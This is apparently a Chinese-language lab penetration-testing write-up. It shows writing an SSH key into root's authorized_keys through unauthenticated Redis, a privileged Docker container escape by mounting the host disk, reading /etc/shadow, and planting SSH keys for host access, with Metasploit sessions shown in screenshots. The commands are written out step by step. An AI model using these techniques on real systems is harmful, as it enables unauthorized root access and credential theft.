## **2.4   redis未授权**

我们发现目标机192.168.1.104还开启了6379端口![](../Images/b2b9fb2b9b64bb8222c27e4bce41a689.png)首先在kali生成密钥

```
ssh-keygen -t rsa
(echo -e "\\n\\n"; cat /root/.ssh/id\_rsa.pub; echo -e "\\n\\n") > 1.txt   #将公钥信息写入1.txt
cat 1.txt | redis-cli -h 192.168.0.103 -x set xxx
```

![](../Images/26e6babdd3218f0be455132659aeb9e8.png)然后使用redis将ssh公钥写入目标主机:

```
config set dir /root/.ssh    # 设置redis的备份路径为/root/.ssh/
config set dbfilename authorized\_keys    # 设置保存文件名为authorized\_keys
save    # 将数据保存在目标服务器硬盘上
```

![](../Images/7a0a0fabff90d3453c8001b369d3f52c.png)ssh登陆![](../Images/8905edf32c0adf22e36eab47e4cda1dd.png)上线msf![](../Images/9d40d14c04de9c067e716f9ae1587a0b.png)

## **2.5   docker逃逸**

这里使用特权模式逃逸首先创建一个目录来挂载文件:

```
mkdir /th1e
```

在docker容器里挂载一个宿主的本地目录，这样某些容器里输出的文件，就可以在本地目录中打开访问了

```
mount /dev/sda1. /th1e
```

![](../Images/a2927adaeab73ecd29f8ab2bc0b309ef.png)这里计划任务不知道为什么一直执行失败因为我们现在是root权限,可以直接拿密码去解密

```
cat /th1e/etc/shadow
```

![](../Images/8e3bab939da28844d1e7f8eb0f845d19.png)  
还有一种办法,这里试试修改密钥还是在kali生成ssh-keygen

```
ssh-keygen -f web
```

将web和web.pub上传到服务器上将web.pub写入到宿主机root的.ssh中![](../Images/0fa3ca9f1f316a28a38b7caff6ee0c7e.png)在跳板机上远程连接成功![](../Images/a58092d42486afda57546c5b4220bbc9.png)这里把这一台也上线到msf,这里创建一个正向连接![](../Images/83a44bbd54f80c7f785e9eef1d9edff0.png)成功上线![](../Images/5fb91ba3f99f934d087336f9c6f4219f.png)
